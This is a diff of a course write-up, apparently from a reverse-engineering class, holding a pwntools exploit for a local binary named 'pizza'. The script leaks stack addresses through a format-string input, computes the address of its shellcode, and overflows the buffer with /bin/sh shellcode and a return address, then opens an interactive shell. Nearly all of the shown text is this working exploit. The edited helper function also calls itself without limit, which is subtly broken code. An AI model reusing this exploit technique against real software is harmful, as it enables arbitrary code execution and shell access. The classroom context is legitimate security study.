@@ -28,28 +28,38 @@ def stackPrint(core, num = 20):
         tmp = rsp + 8 * i
         addresses.append(tmp)
 
-    # Print first half of the stack
+    # Print first address
     for addr in addresses:
         print(f"{addr:x}\t{core.read(addr, 8)}")
 
     # Print Stack Pointer
     print(f"{rsp:x}\t{core.read(rsp, 8)} <<<<< RSP")
 
-    # Print second half of the stack
-    for i in range(x - 1, 0, -1):
-        tmp = rsp - 8 * i
+    # Print second half
+    for i in range(x -1, 0, -1):
+        tmp = rsp -8 * i
         print(f"{tmp:x}\t{core.read(tmp, 8)}")
+    
+    stackPrint(core, num=10)
+
+#context.log_level = 'error'
 
 # Executable and Linkable Format
 elf = ELF("./pizza")
 
 context(arch='amd64', os='linux', endian='little', word_size=64)
 
+#getname_address = elf.symbols["getname"]
+
 shellcode = asm(shellcraft.amd64.linux.sh())
 
+#print(f"Shellcode: {shellcode.hex().upper()}")
+#print(len(shellcode))
 victim = process("./pizza")
 
 input1 = b"%p %p %p %p %p %p %p %p %p"
+
+
 
 print(str(victim.recvline(), "latin-1"))
 victim.sendline(input1)
@@ -57,8 +67,8 @@ victim.sendline(input1)
 var = str(victim.recvline(), "latin-1")
 print(var)
 
-# Subtract offset to the start of shellcode
-addr = int(var.split(" ")[7], 16) - 112
+# Substract offsetto the start of shellcode
+addr = int(var.split(" ")[7],16) -112
 
 input2 = shellcode + b"T"*88 + addr.to_bytes(8, 'little')
 var = str(victim.recvline(), "latin-1")
@@ -66,16 +76,17 @@ victim.sendline(b"4")
 
 victim.sendline(input2)
 
-# Print the stack
-stackPrint(victim, num=20)
-
 victim.interactive()
 
 victim.wait()
 
 exit()
-
 ```
 
 ### Explanation and Screenshots
 In order to crash the victim program we had to...
+
+#### Screenshot
+![Screenshot from 2024-05-03 12-20-21](https://github.com/erickn02/CS479-579-Reverse-Engineering-at-NMSU/assets/111537523/bee9e809-b836-4ec0-a301-0f69fec5ddac)
+
+
